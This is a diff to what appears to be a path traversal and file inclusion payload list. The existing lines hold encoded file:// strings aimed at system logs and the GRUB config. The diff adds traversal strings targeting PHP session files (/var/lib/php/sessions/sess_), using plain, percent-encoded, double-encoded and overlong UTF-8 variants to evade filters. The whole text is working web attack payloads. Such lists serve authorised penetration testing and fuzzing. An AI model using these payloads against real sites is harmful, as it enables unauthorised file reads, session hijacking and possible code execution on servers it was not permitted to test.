@@ -661,3 +661,17 @@ file///%2e/%2e/%2f/76/61/72/%2f/6c/6f/67/%2f/61/70/74/%2f/74/65/72/6d/%2e/6c/6f/
 file///%2e/%2e/%2f/76/61/72/%2f/6c/6f/67/%2f/70/61/63/6d/61/6e/%2e/6c/6f/67
 file///%2e/%2e/%2f/76/61/72/%2f/6c/6f/67/%2f/69/6e/73/74/61/6c/6c/65/72/%2f/73/79/73/6c/6f/67
 file///%2e/%2e/%2f/62/6f/6f/74/%2f/67/72/75/62/%2f/67/72/75/62/%2e/63/66/67
+../../../../../../../../../var/lib/php/sessions/sess_
+../../../../../../../var/lib/php/sessions/sess_
+../../../../../../var/lib/php/sessions/sess_
+../../../../../var/lib/php/sessions/sess_
+../../../../var/lib/php/sessions/sess_
+../../../var/lib/php/sessions/sess_
+../../var/lib/php/sessions/sess_
+../var/lib/php/sessions/sess_
+..%2f..%2f..%2f..%2f..%2f..%2fvar%2flib%2fphp%2fsessions%2fsess_
+..%252f..%252f..%252f..%252fvar%252flib%252fphp%252fsessions%252fsess_
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flib%2fphp%2fsessions%2fsess_
+..%2e%2e%2f..%2e%2e%2f..%2e%2e%2fvar%2flib%2fphp%2fsessions%2fsess_
+%c0%ae%c0%ae%2f%c0%ae%c0%ae%2fvar%2flib%2fphp%2fsessions%2fsess_
+..%252f..%252f..%252fvar%252flib%252fphp%252fsessions%252fsess_
